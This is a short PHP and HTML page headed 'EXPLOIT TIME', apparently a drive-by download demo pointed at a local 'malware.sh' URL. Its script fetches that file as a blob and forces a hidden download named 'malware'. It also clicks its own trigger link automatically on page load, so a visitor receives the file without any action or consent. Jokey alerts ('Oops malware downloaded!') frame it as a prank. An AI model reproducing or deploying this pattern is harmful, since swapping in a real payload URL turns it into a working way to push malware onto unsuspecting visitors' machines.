<?php
	$uriMalw='http://127.0.0.1:8080/malware.sh';
?>
<center>
	<h1>EXPLOIT TIME</h1>
	<a style='color:green' href='<?=$uriMalw?>'>
		NOPE MALWARE!
	</a>
	<a id='clickme' style='color:red' onclick='runExploit();'>
		Run exploit... Oops!
	</a>
</center>
<script>
	function runExploit(){
		uriMalw="<?=$uriMalw?>";
		fetch(uriMalw)
		  .then(resp => resp.blob())
		  .then(blob => {
			const url = window.URL.createObjectURL(blob);
			const a = document.createElement('a');
			a.style.display = 'none';
			a.href = url;
			// the filename you want
			a.download = 'malware';
			document.body.appendChild(a);
			a.click();
			window.URL.revokeObjectURL(url);
			window.reload();
			alert('your malware has downloaded!'); // or you know, something with better UX...
		  })
		  .catch(() => alert('Oops malware downloaded!'));
	}
	document.getElementById("clickme").click();
</script>
